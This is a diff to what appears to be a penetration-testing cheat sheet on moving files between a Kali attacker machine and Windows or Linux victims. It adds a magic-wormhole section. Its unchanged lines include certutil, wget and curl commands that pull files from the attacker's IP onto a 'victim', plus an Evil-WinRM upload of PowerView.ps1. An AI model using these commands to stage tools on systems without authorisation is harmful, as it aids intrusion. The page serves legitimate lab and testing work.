@@ -17,17 +17,62 @@ When using `python3 -m http.server`, be sure to close via `CTRL + C` to send a S
 This is because anyone on the network can arbitrarily obtain files from your system if they're listening!!
 {% endhint %}
 
+## Remote, from anywhere in the world file transfer (Internet Required)
+
+[Magic-wormhole](https://github.com/magic-wormhole/magic-wormhole) is a fantastic Python utility that makes this possible.&#x20;
+
+It is a "secure" way of sending small and large files over the Internet in a secure fashion.
+
+{% hint style="info" %}
+:sunglasses: This is really, really cool.
+{% endhint %}
+
+**Install via:**
+
+<pre><code><strong># Linux
+</strong><strong>sudo apt install magic-wormhole
+</strong><strong>
+</strong><strong># Windows
+</strong><strong>pip install magic-wormhole
+</strong></code></pre>
+
+**From the computer you want to send a file from, tell your friend (or yourself) to run:**
+
+```
+wormhole send <file_name_here>
+
+# On Windows, you may need to use wormhole.exe
+wormhole.exe send <file_name_here>
+```
+
+:bulb:You will then receive a code to use on the receiving computer.
+
+**Then on the computer you want to receive the file on:**
+
+```
+wormhole receive
+
+#or 
+wormhole.exe receive
+
+# It will then prompt for the code
+
+# File transfer will be initiated upon proper entry
+```
+
+_You'll then magically get your file!_
+
 ## Windows->Linux Methods
 
 ### SMB Server
 
-On Kali:
+**On Kali:**
 
 ```
 impacket-smbserver smb . -smb2support
 ```
 
-On Windows:
+**On Windows:**
 
 ```
 net use \\<kali-ip>\smb
@@ -60,7 +105,7 @@ Set it to Enabled, click OK, and close the editor.
 
 On the Windows side, use an SCP client like PowerShell with OpenSSH or a tool like [WinSCP](https://winscp.net/).
 
-For PowerShell, use the following command (replacing `<user>`, `<Kali_IP>`, and paths as necessary):
+**For PowerShell, use the following command (replacing `<user>`, `<Kali_IP>`, and paths as necessary):**
 
 ```
 scp <path_to_local_file> <user>@<Kali_IP>:/path/on/kali
@@ -105,13 +150,13 @@ Evil-WinRM upload /file/name/here
 
 ### Certutil
 
-On Kali:
+**On Kali:**
 
 ```
 python3 -m http.server
 ```
 
-On Windows:
+**On Windows:**
 
 ```
 certutil -urlcache -f http://<kali_ip_here:8000>/name_of_file name_of_file
@@ -156,13 +201,13 @@ Evil-WinRM: PS C:\programdata> upload /../../../PowerView.ps1
 
 ### Wget
 
-On Kali:
+**On Kali:**
 
 ```
 python3 -m http.server
 ```
 
-On Victim:
+**On Victim:**
 
 ```
 wget http://<tun0_ip_here>:8000/<file_name_here> <file_name_here>
@@ -176,7 +221,7 @@ wget -r http://192.168.76.146:8000/stack
 
 #### Even Better
 
-Download it all:
+**Download it all:**
 
 ```
 wget -r -l inf -np -nH --cut-dirs=0 -R "index.html*" -P <Directory_to_save_to> http://webserver
@@ -184,13 +229,13 @@ wget -r -l inf -np -nH --cut-dirs=0 -R "index.html*" -P <Directory_to_save_to> h
 
 ### Curl
 
-On Kali:
+**On Kali:**
 
 ```
 python3 -m http.server
 ```
 
-On Victim:
+**On Victim:**
 
 ```
 curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
@@ -202,7 +247,7 @@ curl http://<tun0_ip_here:8000/<file_name_here> <file_name_here>
 * SSH Creds or Key
 * Identify path of file you want with <mark style="color:red;">`pwd`</mark>
 
-Copying a file from a remote system to yours:
+**Copying a file from a remote system to yours:**
 
 ```
 scp user@10.10.10.1:C:/ftp/infrastructure .
@@ -211,7 +256,7 @@ password:
 Infrastructure.pdf                                                     100%   45KB 240.7KB/s   00:00    
 ```
 
-Transfering a file from your system to a remote system:
+**Transfering a file from your system to a remote system:**
 
 ```
 scp root@10.10.10.1 -i ~/.ssh/id_rsa wordlist.txt /root/wordlists
